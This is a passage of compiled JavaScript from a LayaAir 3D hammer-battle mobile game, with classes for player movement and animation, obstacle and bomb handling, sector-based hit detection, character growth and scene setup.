        GameInit() {
            Game.GameManager.instance.PlayerMove.Init();
            Game.GameManager.instance.EnemyManager.clearEnemy();
            Game.GameManager.instance.SceneManager.homeScene();
            let model = Game.GameManager.instance.SceneManager.setPlayerSkin(Skin[0].model, Game.GameManager.instance.SceneManager.player);
            model.active = true;
            Game.GameManager.instance.SceneManager.initHamer();
            Game.nowSkinIndex = 0;
        }
    }
    Game.GameStart = GameStart;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class ObstacleCtr extends Laya.Script {
        constructor() {
            super();
            this.isdie = false;
            this.enemyLv = 1;
        }
        onAwake() {
            this.obstacle = this.owner;
            this.persons = this.obstacle.parent;
        }
        enemyDie() {
            if (this.obstacle.name == "tree") {
                Game.GameManager.instance.SceneManager.shuPlay(new Laya.Vector3(this.obstacle.transform.position.x, 0.8, this.obstacle.transform.position.z));
                this.obstacle.transform.localRotationEulerX = -90;
                this.obstacle.transform.localScaleZ = 0.01;
                Laya.timer.once(1000, this, () => {
                    this.obstacle.transform.localScale = new Laya.Vector3(1, 1, 1);
                    this.obstacle.transform.localRotationEuler = new Laya.Vector3(0, 0, 0);
                    Game.Pool.instance.recoveryObj("tree", this.obstacle);
                });
            }
            else {
                if (Game.GameManager.instance.PlayerMove.iswin)
                    return;
                Game.GameManager.instance.SceneManager.boomPlay(new Laya.Vector3(this.obstacle.transform.position.x, 0.5, this.obstacle.transform.position.z));
                Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_boom);
                for (let index = 0; index < this.persons.numChildren; index++) {
                    let target = this.persons.getChildAt(index);
                    if (target.name == "enemy" || target.name == "player") {
                        let dis = Laya.Vector3.distance(target.transform.localPosition, this.obstacle.transform.localPosition);
                        if (dis < 3) {
                            if (target.name == "enemy") {
                                let enemyScript = target.getComponent(Game.EnemyMove);
                                if (enemyScript.isdie == false) {
                                    enemyScript.isdie = true;
                                    enemyScript.enemyDie();
                                    if (!Game.GameManager.instance.PlayerMove.iswin && ConfigMgr.Match_Num == 0) {
                                        Game.GameManager.instance.PlayerMove.winFun();
                                        Laya.timer.once(2000, this, () => {
                                            Game.ViewManager.showSuccessScene();
                                        });
                                    }
                                }
                            }
                            else {
                                if (ConfigMgr.Match_Num == 0)
                                    return;
                                if (target.name == "player") {
                                    let enemyScript = target.getComponent(Game.PlayerMove);
                                    if (enemyScript.isdie == false) {
                                        enemyScript.isdie = true;
                                        enemyScript.playerDie();
                                    }
                                }
                            }
                        }
                    }
                }
                Game.Pool.instance.recoveryObj("bomb", this.obstacle);
            }
        }
    }
    Game.ObstacleCtr = ObstacleCtr;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class PlayerAni extends Laya.Script3D {
        constructor() {
            super();
        }
        onAwake() {
            this.ani = this.owner.getComponent(Laya.Animator);
        }
        stand() {
            this.ani.speed = 1;
            this.ani.play("stand", 0, 0);
        }
        run() {
            this.ani.speed = Game.movingSpd / 100;
            this.ani.play("run", 0, 0);
        }
        attack(attackCallback, attackJudgeCallback) {
            this.ani.speed = 0.9;
            this.attackJudgeCallback = attackJudgeCallback;
            this.attackCallback = attackCallback;
            this.ani.play("attack", 0, 0);
        }
        win() {
            this.ani.speed = 1;
            this.ani.play("win", 0, 0);
        }
        die() {
            this.ani.speed = 1;
            this.ani.play("die", 0, 0);
        }
        bianshen_stand() {
            this.ani.speed = 1;
            this.ani.play("bianshen_stand", 0, 0);
        }
        bianshen_start(callback) {
            this.bianshen_startFun = callback;
            this.ani.speed = 1;
            this.ani.play("bianshen_start", 0, 0);
        }
        bianshen_start2(callback) {
            this.bianshen_start2Fun = callback;
            this.ani.speed = 1;
            this.ani.play("bianshen_start2", 0, 0);
        }
        bianshen_end() {
            this.ani.speed = 1;
            this.ani.play("bianshen_end", 0, 0);
        }
        attackOver() {
            if (this.attackCallback) {
                this.attackCallback();
            }
        }
        attackJudge() {
            if (this.attackJudgeCallback) {
                this.attackJudgeCallback();
            }
        }
        bianshen_startOver() {
            if (this.bianshen_startFun) {
                this.bianshen_startFun();
            }
        }
        bianshen_start2Over() {
            if (this.bianshen_start2Fun) {
                this.bianshen_start2Fun();
            }
        }
    }
    Game.PlayerAni = PlayerAni;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class PlayerMove extends Laya.Script3D {
        constructor() {
            super();
            this.posX = 0;
            this.posY = 0;
            this.originPoint = new Laya.Vector2(0, 0);
            this.angle = 0;
            this.movePos = new Laya.Vector3(0, 0, 0);
            this.isAttack = false;
            this.isrun = false;
            this.playerLv = 1;
            this.centerPos = new Laya.Vector3(0, 0, 0);
            this.isdie = false;
            this.iswin = false;
            this.iswudi = false;
            this.selfhead = "";
            this.selfname = "";
            this.isrot = false;
            this.ismouse = false;
            this.enemys = [];
            this.rotTween = new Laya.Tween();
            this.attackArr = [];
            Game.GameManager.instance.PlayerMove = this;
        }
        onAwake() {
            this.gameManager = Game.GameManager.instance;
            this.sceneManager = this.gameManager.SceneManager;
            this.player = this.owner;
            this.attack_smoke = this.sceneManager.game_Scene.getChildByName("attack_smoke");
            this.attackPos = this.player.getChildByName("attackPos");
            this.playerAni = this.player.addComponent(Game.PlayerAni);
            this.endCarmera = this.player.getChildByName("Camera_end");
            this.lihua = this.player.getChildByName("Camera_end").getChildByName("lihua");
            this.player_biao = this.player.getChildByName("biao");
            this.sceneManager.playerAni = this.playerAni;
            this.selfname = "You";
            this.chuizi = Game.GameManager.instance.SceneManager.findChild("Bip001/Bip001 Pelvis/Bip001 Spine/Bip001 Neck/Bip001 R Clavicle/Bip001 R UpperArm/Bip001 R Forearm/Bip001 R Hand/wuqi", this.player);
            Laya.timer.frameLoop(5, this, this.RangeEnemy);
        }
        onLateUpdate() {
            this.sceneManager.game_Camera.transform.localPositionX = this.player.transform.localPositionX;
            this.sceneManager.game_Camera.transform.localPositionZ = this.player.transform.localPositionZ;
            let dis = Laya.Vector3.distance(this.player.transform.localPosition.clone(), this.centerPos);
            if (dis >= 25) {
                let newPos = new Laya.Vector3(this.player.transform.localPositionX + this.movePos.x * 10, 0, this.player.transform.localPositionZ + this.movePos.z * 10);
                let dis2 = Laya.Vector3.distance(newPos, this.centerPos);
                if (dis2 >= 26) {
                    this.movePos.x = 0;
                    this.movePos.z = 0;
                }
            }
            if (!this.isrot) {
                this.player.transform.translate(this.movePos, false);
            }
            this.enemyPoint();
        }
        playerRot() {
            if (this.isrot)
                return;
            let rot = Math.abs(this.angle - this.player.transform.localRotationEulerY);
            if (rot >= 60) {
                this.rotTween.clear();
                this.isrot = true;
                if (this.angle >= this.player.transform.localRotationEulerY) {
                    let rot1 = (360 - this.angle) + this.player.transform.localRotationEulerY;
                    if (rot1 <= rot) {
                        this.rotTween.to(this.player.transform, { localRotationEulerY: 0 }, this.player.transform.localRotationEulerY * Game.turnTime, null, Laya.Handler.create(this, () => {
                            this.player.transform.localRotationEulerY = 360;
                            this.rotTween.to(this.player.transform, { localRotationEulerY: this.angle }, (360 - this.angle) * Game.turnTime, null, Laya.Handler.create(this, () => {
                                this.isrot = false;
                                this.changeMove();
                            }));
                        }));
                    }
                    else {
                        this.rotTween.to(this.player.transform, { localRotationEulerY: this.angle }, rot * Game.turnTime, null, Laya.Handler.create(this, () => {
                            this.isrot = false;
                            this.changeMove();
                        }));
                    }
                }
                else {
                    let rot1 = (360 - this.player.transform.localRotationEulerY) + this.angle;
                    if (rot1 <= rot) {
                        this.rotTween.to(this.player.transform, { localRotationEulerY: 360 }, (360 - this.player.transform.localRotationEulerY) * Game.turnTime, null, Laya.Handler.create(this, () => {
                            this.player.transform.localRotationEulerY = 0;
                            this.rotTween.to(this.player.transform, { localRotationEulerY: this.angle }, this.angle * Game.turnTime, null, Laya.Handler.create(this, () => {
                                this.isrot = false;
                                this.changeMove();
                            }));
                        }));
                    }
                    else {
                        this.rotTween.to(this.player.transform, { localRotationEulerY: this.angle }, rot * Game.turnTime, null, Laya.Handler.create(this, () => {
                            this.isrot = false;
                            this.changeMove();
                        }));
                    }
                }
            }
            else {
                this.player.transform.localRotationEulerY = this.angle;
                this.changeMove();
            }
        }
        onLoad() {
            this.isdie = false;
            this.iswin = false;
            this.movePos = new Laya.Vector3(0, 0, 0);
            this.isAttack = false;
            this.isrun = false;
            this.onMouse();
            this.endCarmera.active = false;
            this.endCarmera.fieldOfView = 90;
            this.angle = 0;
            this.playerLv = 1;
        }
        Init() {
            this.isdie = false;
            this.iswin = false;
            this.movePos = new Laya.Vector3(0, 0, 0);
            this.isAttack = false;
            this.isrun = false;
            this.endCarmera.active = false;
            this.endCarmera.fieldOfView = 90;
            this.sceneManager.carmera.active = true;
            this.player.transform.localPosition = new Laya.Vector3(0, 0, 0);
            this.angle = 0;
            this.player.transform.localRotationEuler = new Laya.Vector3(0, 0, 0);
            this.player.transform.localScale = new Laya.Vector3(Grow[0].scaling, Grow[0].scaling, Grow[0].scaling);
            console.log(Grow[0].scaling);
            this.playerAni.stand();
            this.playerLv = 1;
        }
        onMouse() {
            Laya.stage.on(Laya.Event.MOUSE_DOWN, this, this.touch_Start);
            Laya.stage.on(Laya.Event.MOUSE_MOVE, this, this.touch_Move);
            Laya.stage.on(Laya.Event.MOUSE_OUT, this, this.touch_End);
            Laya.stage.on(Laya.Event.MOUSE_UP, this, this.touch_End);
        }
        offMosue() {
            Laya.stage.off(Laya.Event.MOUSE_DOWN, this, this.touch_Start);
            Laya.stage.off(Laya.Event.MOUSE_MOVE, this, this.touch_Move);
            Laya.stage.off(Laya.Event.MOUSE_OUT, this, this.touch_End);
            Laya.stage.off(Laya.Event.MOUSE_UP, this, this.touch_End);
        }
        touch_Start() {
            this.originPoint = new Laya.Vector2(Laya.stage.mouseX, Laya.stage.mouseY);
            this.ismouse = true;
            if (!this.isAttack) {
                this.playerAni.run();
                this.isrun = true;
            }
        }
        touch_Move() {
            if (this.isAttack || this.isrot)
                return;
            if (!this.isrun) {
                this.isrun = true;
                this.playerAni.run();
            }
            let deltaX = Laya.stage.mouseX - this.originPoint.x;
            let deltaY = Laya.stage.mouseY - this.originPoint.y;
            this.angle = (Math.atan2(deltaX, deltaY) * 180 / Math.PI);
            if (this.angle < 0)
                this.angle += 360;
            this.angle = Math.round(this.angle);
            this.playerRot();
        }
        touch_End() {
            this.ismouse = false;
            if (this.isAttack)
                return;
            this.isAttack = true;
            this.playerAni.attack(() => {
                if (!this.isdie) {
                    this.playerAni.stand();
                    this.isAttack = false;
                }
            }, null);
            if (this.isdie)
                return;
            this.movePos.x = 0;
            this.movePos.z = 0;
            this.isrun = false;
            this.attack_smoke.transform.localPositionX = this.attackPos.transform.position.x;
            this.attack_smoke.transform.localPositionZ = this.attackPos.transform.position.z;
            this.attack_smoke.transform.localRotation = this.attackPos.transform.rotation;
            this.attack_smoke.transform.localScale = this.player.transform.localScale;
            let smokeTime = 700;
            this.judgeAttackEnemy();
            if (this.iswin)
                return;
            Laya.timer.once(smokeTime, this, () => {
                this.attack_smoke.particleSystem.play();
            });
        }
        changeMove() {
            if (!this.ismouse || this.isAttack || this.isdie)
                return;
            let rotation = this.player.transform.localRotationEulerY - 90 + 180;
            let rot = rotation * Math.PI / 180;
            let x = Math.cos(rot) / 20;
            let z = Math.sin(rot) / 20;
            let addX = -x * (Game.movingSpd / 100);
            let addZ = z * (Game.movingSpd / 100);
            this.movePos.x = addX;
            this.movePos.z = addZ;
        }
        judgeAttackEnemy() {
            let delayTime = 400;
            Laya.timer.once(delayTime, this, () => {
                if (this.isdie)
                    return;
                let attackArr = [];
                for (let i = 0; i < this.sceneManager.persons.numChildren; i++) {
                    let target = this.sceneManager.persons.getChildAt(i);
                    if (target == this.player)
                        continue;
                    this.sceneManager.sectorCollision(this.player.transform.localScaleX * 3, 60, target, this.player, () => {
                        if (target.name == "enemy") {
                            if (target.getComponent(Game.EnemyMove).isdie == false) {
                                attackArr.push(target);
                            }
                        }
                        else {
                            attackArr.push(target);
                        }
                    });
                }
                this.attackEnemy(attackArr);
            });
        }
        ;
        attackEnemy(arr) {
            if (arr.length == 0) {
                Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_ham_hit);
                Game.MultiPlatforms.vibrateShort();
                return;
            }
            ;
            let isover = false;
            ConfigMgr.Match_Num = this.sceneManager.AINums();
            let overNum = 0;
            let nowNum = 0;
            for (let i = 0; i < arr.length; i++) {
                if (arr[i].name == "enemy" && arr[i].getComponent(Game.EnemyMove).isdie == false) {
                    overNum += 1;
                }
            }
            if (overNum == ConfigMgr.Match_Num) {
                isover = true;
                this.playerAni.attack(() => {
                    if (!this.isdie) {
                        this.playerAni.stand();
                        this.isAttack = false;
                    }
                }, null);
            }
            for (let i = 0; i < arr.length; i++) {
                let target = arr[i];
                let EnemyScript;
                if (target.name == "enemy") {
                    EnemyScript = target.getComponent(Game.EnemyMove);
                }
                else {
                    EnemyScript = target.getComponent(Game.ObstacleCtr);
                }
                if (EnemyScript.isdie)
                    continue;
                EnemyScript.isdie = true;
                ConfigMgr.Match_Num = this.sceneManager.AINums();
                if (isover && target.name == "enemy") {
                    nowNum += 1;
                    if (nowNum == overNum) {
                        this.winFun();
                    }
                    this.playerAni.ani.speed = 0.2;
                    EnemyScript.movePos = new Laya.Vector3(0, 0, 0);
                    EnemyScript.enemyAni.ani.speed = 0.2;
                    setTimeout(() => {
                        let data = {
                            selfname: this.selfname,
                            selfhead: this.selfhead,
                            killname: EnemyScript.selfName,
                            killhead: EnemyScript.selfHead
                        };
                        mvc.send(GameEvt.killRefresh, data);
                        this.sceneManager.createCoin(target.transform.localPosition);
                        EnemyScript.enemyDie();
                    }, 1600);
                }
                else {
                    if (target.name == "enemy") {
                        let data = {
                            selfname: this.selfname,
                            selfhead: this.selfhead,
                            killname: EnemyScript.selfName,
                            killhead: EnemyScript.selfHead
                        };
                        mvc.send(GameEvt.killRefresh, data);
                        this.sceneManager.createCoin(target.transform.localPosition);
                    }
                    EnemyScript.enemyDie();
                    if (target.name == "tree") {
                        Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_tree);
                    }
                }
                if (target.name == "enemy") {
                    mvc.send(GameEvt.comboRefresh);
                }
                Game.GameManager.instance.ShakeEffect.shakeFun(500);
                Game.MultiPlatforms.vibrateLong();
                if (this.iswin) {
                    this.lihua.particleSystem.play();
                    Laya.timer.once(2500, this, () => {
                        Game.ViewManager.showSuccessScene();
                    });
                }
                if (this.iswin)
                    return;
                this.addScale(EnemyScript.enemyLv, true);
            }
        }
        playerDie() {
            Game.SoundManager.playSound(Game.SoundManager.soundName.Audio_die);
            this.chuizi.active = false;
            this.isdie = true;
            this.movePos.x = 0;
            this.movePos.z = 0;
            this.playerAni.stand();
            this.isrun = false;
            this.isAttack = false;
            this.player.transform.localRotationEulerX = -90;
            this.player.transform.localScaleZ = 0.01;
            this.playerAni.die();
            this.offMosue();
            mvc.send(GameEvt.surplusRefresh, ConfigMgr.Match_Num);
            Laya.timer.once(500, this, () => {
                this.chuizi.active = true;
                Game.fast.showGameReviveWindow();
            });
        }
        reviveFun() {
            this.chuizi.active = true;
            this.playerAni.stand();
            this.isdie = false;
            this.isAttack = false;
            this.player.transform.localRotationEulerX = 0;
            this.player.transform.localScaleZ = this.player.transform.localScaleX;
            this.iswudi = true;
            Laya.timer.once(1000, this, () => {
                this.iswudi = false;
                this.isdie = false;
            });
            this.onMouse();
        }
        winFun() {
            ConfigMgr.Match_Num = 0;
            this.iswin = true;
            this.sceneManager.carmera.active = false;
            this.endCarmera.fieldOfView = 90;
            this.endCarmera.active = true;
            Laya.Tween.to(this.endCarmera, { fieldOfView: 60 }, 1000, null);
            this.offMosue();
            Laya.timer.frameOnce(2, this, () => {
                this.playerAni.ani.speed = 0.2;
            });
        }
        enemyPoint() {
            let carmeraHeight = this.sceneManager.carmera.transform.localPositionY;
            let value = 0.33 * carmeraHeight + 2.07;
            let minX = this.player.transform.position.x - value;
            let maxX = value + this.player.transform.position.x;
            for (let i = 0; i < this.enemys.length; i++) {
                if (this.enemys[i].parent) {
                    if (this.enemys[i].getComponent(Game.EnemyMove).isdie == false) {
                        if (this.enemys[i].transform.position.x >= maxX) {
                            let rot = this.sceneManager.getRot(new Laya.Vector2(this.player.transform.position.x, this.player.transform.position.z), new Laya.Vector2(this.enemys[i].transform.position.x, this.enemys[i].transform.position.z));
                            let localY = this.getPointY(this.player, this.enemys[i], maxX);
                            let data = {
                                index: i,
                                visible: true,
                                pos: { x: 680, y: localY },
                                rot: rot + 90
                            };
                            mvc.send(GameEvt.refreshPoint, data);
                        }
                        else if (this.enemys[i].transform.position.x <= minX) {
                            let rot = this.sceneManager.getRot(new Laya.Vector2(this.player.transform.position.x, this.player.transform.position.z), new Laya.Vector2(this.enemys[i].transform.position.x, this.enemys[i].transform.position.z));
                            let localY = this.getPointY(this.player, this.enemys[i], minX);
                            let data = {
                                index: i,
                                visible: true,
                                pos: { x: 40, y: localY },
                                rot: rot + 90
                            };
                            mvc.send(GameEvt.refreshPoint, data);
                        }
                        else {
                            let data = {
                                index: i,
                                visible: false,
                                pos: { x: 0, y: 0 },
                                rot: 0
                            };
                            mvc.send(GameEvt.refreshPoint, data);
                        }
                    }
                    else {
                        let data = {
                            index: i,
                            visible: false,
                            pos: { x: 0, y: 0 },
                            rot: 0
                        };
                        mvc.send(GameEvt.refreshPoint, data);
                    }
                }
                else {
                    let data = {
                        index: i,
                        visible: false,
                        pos: { x: 0, y: 0 },
                        rot: 0
                    };
                    mvc.send(GameEvt.refreshPoint, data);
                }
            }
        }
        getPointY(self, other, valueX) {
            let k = (other.transform.localPositionZ - self.transform.localPositionZ) / (other.transform.localPositionX - self.transform.localPositionX);
            let b = self.transform.localPositionZ - k * self.transform.localPositionX;
            let pos = this.sceneManager.GetPos(new Laya.Vector3(valueX, 0, (k * valueX + b)));
            return pos.y;
        }
        RangeEnemy() {
            let arr = [];
            let isboom = false;
            for (let i = 0; i < this.sceneManager.persons.numChildren; i++) {
                let target = this.sceneManager.persons.getChildAt(i);
                if (target == this.player)
                    continue;
                this.sceneManager.sectorCollision(this.player.transform.localScaleX * 3, 60, target, this.player, () => {
                    if (target.name == "bomb") {
                        isboom = true;
                    }
                    ;
                    arr.push(target);
                });
            }
            if (arr.length == 0) {
                if (this.player_biao.meshRenderer.material.albedoColor != new Laya.Vector4(1, 1, 1, 237 / 255)) {
                    this.player_biao.meshRenderer.material.albedoColor = new Laya.Vector4(1, 1, 1, 237 / 255);
                }
            }
            else {
                if (isboom) {
                    if (this.player_biao.meshRenderer.material.albedoColor != new Laya.Vector4(1, 0, 0, 237 / 255)) {
                        this.player_biao.meshRenderer.material.albedoColor = new Laya.Vector4(1, 0, 0, 237 / 255);
                    }
                }
                else {
                    if (this.player_biao.meshRenderer.material.albedoColor != this.sceneManager.biaoColors[ConfigMgr.nowLand]) {
                        this.player_biao.meshRenderer.material.albedoColor = this.sceneManager.biaoColors[ConfigMgr.nowLand];
                    }
                }
            }
        }
        changeBig() {
            let rand = Math.random();
            let bigNum = 0;
            if (rand > 0.5) {
                bigNum = 2;
            }
            else if (rand > 0.2) {
                bigNum = 3;
            }
            else {
                bigNum = 4;
            }
            let realAdd = 0;
            if (this.playerLv + bigNum >= Grow.length) {
                realAdd = Grow.length - this.playerLv;
            }
            else {
                realAdd = bigNum;
            }
            let datas = {
                tip: "Get Bigger x" + realAdd + "",
                head: this.selfhead
            };
            mvc.send(GameEvt.bigTips, datas);
            this.addScale(bigNum, false);
        }
        addScale(addNum, israndEnemy = false) {
            let isaddSize = false;
            if (this.playerLv <= Grow.length) {
                let lv = this.playerLv + addNum;
                let nowlv = this.playerLv;
                if (lv >= Grow.length) {
                    lv = Grow.length;
                    this.playerLv = Grow.length;
                }
                else {
                    this.playerLv += addNum;
                }
                if (lv - nowlv > 1) {
                    for (let i = nowlv; i < lv; i++) {
                        if (Grow[i].cameraOut != 0) {
                            isaddSize = true;
                            break;
                        }
                    }
                }
            }
            let scaleNum = Grow[this.playerLv - 1].scaling;
            let k = (Game.cemaraMax - Game.cemaraMin) / (Game.cameraMaxLevel - 1);
            let b = Game.cemaraMin - k;
            let addSize = (Game.cemaraMax - Game.cemaraMin) * Math.log(this.playerLv) / Math.log(Game.cameraMaxLevel) + Game.cemaraMin;
            Laya.timer.once((400), this, () => {
                Laya.Tween.to(this.player.transform, { localScaleX: (scaleNum + 0.1), localScaleY: (scaleNum + 0.1), localScaleZ: (scaleNum + 0.1) }, 100, null, Laya.Handler.create(this, () => {
                    Laya.Tween.to(this.player.transform, { localScaleX: scaleNum, localScaleY: scaleNum, localScaleZ: scaleNum }, 150, null, Laya.Handler.create(this, () => {
                        if (Grow[this.playerLv - 1].cameraOut != 0 || isaddSize) {
                            if (this.sceneManager.carmera.transform.localPositionY < Game.cemaraMax) {
                                Laya.Tween.to(this.sceneManager.carmera.transform, { localPositionY: (addSize * 0.66 - 0.08), localPositionZ: addSize }, 1000, null);
                            }
                        }
                        if (israndEnemy) {
                            if (this.playerLv >= 8) {
                                Game.GameManager.instance.EnemyManager.randChangeScale();
                            }
                        }
                    }));
                }));
            });
        }
    }
    Game.PlayerMove = PlayerMove;
})(Game || (Game = {}));
var Game;
(function (Game) {
    class SceneManager extends Laya.Script {
        constructor() {
            super();
            this.addSize = 0;
            this.localY = 0;
            this.mapName = "";
            this.treeNames = ["tree1", "tree2", "zhiwu1", "mudi", "yeshu1", "shuijing", "mogu", "tree_h"];
            this.skyColors = [
                new Laya.Vector4(87 / 255, 229 / 255, 241 / 255, 0),
                new Laya.Vector4(33 / 255, 108 / 255, 195 / 255, 0),
                new Laya.Vector4(55 / 255, 72 / 255, 123 / 255, 0),
                new Laya.Vector4(87 / 255, 229 / 255, 241 / 255, 0),
                new Laya.Vector4(30 / 255, 100 / 255, 200 / 255, 0),
                new Laya.Vector4(68 / 255, 23 / 255, 40 / 255, 0),
                new Laya.Vector4(47 / 255, 220 / 255, 255 / 255, 0),
                new Laya.Vector4(47 / 255, 220 / 255, 255 / 255, 0),
            ];
            this.biaoColors = [
                new Laya.Vector4(255 / 255, 243 / 255, 0 / 255, 203 / 255),
                new Laya.Vector4(57 / 255, 255 / 255, 14 / 255, 203 / 255),
                new Laya.Vector4(255 / 255, 0 / 36, 123 / 255, 203 / 255),
                new Laya.Vector4(255 / 255, 243 / 255, 0 / 255, 203 / 255),
                new Laya.Vector4(88 / 255, 255 / 255, 250 / 255, 203 / 255),
                new Laya.Vector4(255 / 255, 243 / 255, 0 / 255, 203 / 255),
                new Laya.Vector4(255 / 255, 243 / 255, 0 / 255, 203 / 255),
                new Laya.Vector4(69 / 255, 255 / 255, 248 / 255, 203 / 255),
            ];
            Game.GameManager.instance.SceneManager = this;
        }
        createScene() {
            Laya.Scene3D.load("sub-first/res/3D/LayaScene_hammer/Conventional/hammer.ls", Laya.Handler.create(this, (res) => {
                this.game_Scene = res;
                Laya.stage.addChildAt(this.game_Scene, 0);
                this.game_Camera = this.game_Scene.getChildByName("Camera_game");
                this.carmera_Shake = this.game_Camera.getChildByName("CameraShake");
                this.persons = this.game_Scene.getChildByName("persons");
                this.carmera = this.carmera_Shake.getChildAt(0);
                this.boom = this.game_Scene.getChildByName("boom");
                this.treeboom = this.game_Scene.getChildByName("shu");
                this.enemyboom = this.game_Scene.getChildByName("attack_boom");
                this.obstacles = this.game_Scene.getChildByName("obstacles");
                this.lands = this.game_Scene.getChildByName("lands");
                this.carmera_Shake.addComponent(Game.ShakeEffect);
                this.persons.addComponent(Game.EnemyManager);
                this.persons.addComponent(Game.GameStart);
                let arr = [];
                for (let index = 0; index < this.persons.numChildren; index++) {
                    let person = this.persons.getChildAt(index);
                    arr.push(person);
                }
                for (let i = 0; i < arr.length; i++) {
                    let person = arr[i];
                    if (person.name == "player") {
                        person.addComponent(Game.PlayerMove);
                        this.player = person;
                    }
                    else if (person.name == "enemy") {
                        person.addComponent(Game.EnemyMove);
                        Game.Pool.instance.setInPool(person, "enemy");
                    }
                    else if (person.name == "bomb") {
                        person.addComponent(Game.ObstacleCtr);
                        Game.Pool.instance.setInPool(person, "bomb");
                    }
                }
                ;
                let treeArr = [];
                for (let i = 0; i < this.obstacles.numChildren; i++) {
                    let tree = this.obstacles.getChildAt(i);
                    treeArr.push(tree);
                }
                treeArr.forEach(element => {
                    element.addComponent(Game.ObstacleCtr);
                    Game.Pool.instance.setInPool(element, "tree");
                });
                let coin = this.game_Scene.getChildByName("coin");
                Game.Pool.instance.setInPool(coin, "coin");
                this.player.removeSelf();
                this.homeScene();
                this.createHomeScene();
                this.player_biao = this.player.getChildByName("biao");
                this.carmera.transform.localRotationEulerX = -35;
                this.carmera.transform.localPositionX = 0;
                this.carmera.transform.localPositionY = (Game.cemaraMax * 0.66 - 0.08);
                this.carmera.transform.localPositionZ = Game.cemaraMax;
                Laya.timer.once(100, this, () => {
                    this.boom.particleSystem.play();
                    this.treeboom.particleSystem.play();
                    this.enemyboom.particleSystem.play();
                });
                this.initHamer();
                ConfigMgr.nowLand = this.getLandIndex();
                this.initLand(ConfigMgr.nowLand);
                ConfigMgr.obstacleName = this.treeNames[ConfigMgr.nowLand];
                console.log("3d加载完成");
            }));
        }
        homeScene() {
            this.game_Scene.active = false;
        }
        gameScene() {
            this.carmera.transform.localRotationEulerX = -35;
            this.carmera.transform.localPositionX = 0;
            this.carmera.transform.localPositionY = (Game.cemaraMax * 0.66 - 0.08);
            this.carmera.transform.localPositionZ = Game.cemaraMax;
        }
        endScene(callback) {
            this.player_biao.active = true;
            Laya.Tween.to(this.carmera.transform, { localPositionX: 0, localPositionY: 2.45, localPositionZ: 4.22, localRotationEulerX: -25.595 }, 800, null, Laya.Handler.create(this, () => {
                if (callback) {
                    callback();
                }
            }));
        }
        sectorCollision(skillDistance = 2, skillAngle = 60, target, self, callback, fail = null) {
            skillAngle = 55;
            let distance = Laya.Vector3.distance(target.transform.localPosition.clone(), self.transform.localPosition.clone());
            let rot = this.getAngle(self, target);
            if (distance <= skillDistance) {
                let selfAngle = self.transform.localRotationEulerY;
                if (selfAngle > (360 - skillAngle / 2)) {
                    let outRange = (selfAngle + skillAngle / 2) - 360;
                    if (rot <= outRange || rot >= (selfAngle - skillAngle / 2)) {
                        if (target) {
                            if (callback) {
                                callback();
                            }
                        }
                    }
                    else {
                        if (fail) {
                            fail();
                        }
                    }
                }
                else if (selfAngle < skillAngle / 2) {
                    let outRange = (selfAngle - skillAngle / 2) + 360;
                    if (rot >= outRange || rot <= (selfAngle + skillAngle / 2)) {
                        if (target) {
                            if (callback) {
                                callback();
                            }
                        }
                    }
                    else {
                        if (fail) {
                            fail();
                        }
                    }
                }
                else {
                    if (Math.abs(self.transform.localRotationEulerY - rot) <= skillAngle / 2) {
                        if (target) {
                            if (callback) {
                                callback();
                            }
                        }
                    }
                    else {
                        if (fail) {
                            fail();
                        }
                    }
                }
            }
            else {
                if (fail) {
                    fail();
                }
            }
        }
        getAngle(obj1 = null, obj2 = null) {
            let pos1 = new Laya.Vector2(obj1.transform.localPositionX, obj1.transform.localPositionZ);
            let pos2 = new Laya.Vector2(obj2.transform.localPositionX, obj2.transform.localPositionZ);
            if (!pos1 || !pos2) {
                return;
            }
            let radian = Math.atan2((pos2.y - pos1.y), (pos2.x - pos1.x));
            let angle = radian * 180 / Math.PI;
            let rot = -angle + 90;
            if (rot < 0) {
                rot += 360;
            }
            return rot;
        }
        getRot(pos1, pos2) {
            if (!pos1 || !pos2) {
                return;
            }
            let radian = Math.atan2((pos2.y - pos1.y), (pos2.x - pos1.x));
            let angle = radian * 180 / Math.PI - 90;
            return angle;
        }
        createHomeScene() {
            let scene = new Laya.Scene3D();
            scene.name = "0";
            let camera = new Laya.Camera(0, 0.1, 1000);
            scene.addChild(camera);
            camera.transform.translate(new Laya.Vector3(0, 0, 5));
            camera.orthographic = true;
            camera.orthographicVerticalSize = 10;
            camera.clearFlag = Laya.CameraClearFlags.DepthOnly;
            var directionLight = new Laya.DirectionLight();
            directionLight.intensity = 1.7;
            directionLight.transform.localRotationEuler = new Laya.Vector3(170, 200, 0);
            scene.addChild(directionLight);
            this.home_Carmera = camera;
            this.home_scene = scene;
            ConfigMgr.Load_3D_Over = 1;
        }
        home_Player(addSize, localY, parentNode) {
            this.addSize = addSize;
            this.localY = localY;
            this.home_Carmera.orthographicVerticalSize = 10;
            this.home_Carmera.transform.localPositionY = 0;
            this.player.transform.localRotationEulerY = 0;
            this.playerAni.bianshen_stand();
            this.player_biao.active = false;
            this.player.transform.localScale = new Laya.Vector3(addSize, addSize, addSize);
            this.home_scene.addChild(this.player);
            this.player.transform.localPositionY = localY;
            parentNode.addChild(this.home_scene);
        }
        playerFly(callback, isall) {
            if (this.player.transform.localRotationEulerY != 0) {
                Laya.Tween.to(this.player.transform, { localRotationEulerY: 0 }, 500, null);
            }
            if (!isall) {
                this.playerAni.bianshen_start2(() => {
                    if (callback) {
                        callback();
                    }
                    Laya.Tween.to(this.home_Carmera.transform, { localPositionY: 6 }, 1000, null);
                    Laya.Tween.to(this.home_Carmera, { orthographicVerticalSize: 1 }, 1000, null, Laya.Handler.create(this, () => {
                        Game.GameManager.instance.GameStart.game_Start();
                    }));
                });
            }
            else {
                this.playerAni.bianshen_start(() => {
                    this.playerAni.bianshen_start2(() => {
                        if (callback) {
                            callback();
                        }
                        Laya.Tween.to(this.home_Carmera.transform, { localPositionY: 6 }, 1000, null);
                        Laya.Tween.to(this.home_Carmera, { orthographicVerticalSize: 1 }, 1000, null, Laya.Handler.create(this, () => {
                            Game.GameManager.instance.GameStart.game_Start();
                        }));
                    });
                });
            }
        }
        composeOver(callback) {
            Laya.Tween.to(Game.GameManager.instance.SceneManager.player.transform, { localRotationEulerY: 0 }, 400, null);
            this.playerAni.bianshen_start(() => {
                this.playerAni.bianshen_end();
                Laya.timer.once(2500, this, () => {
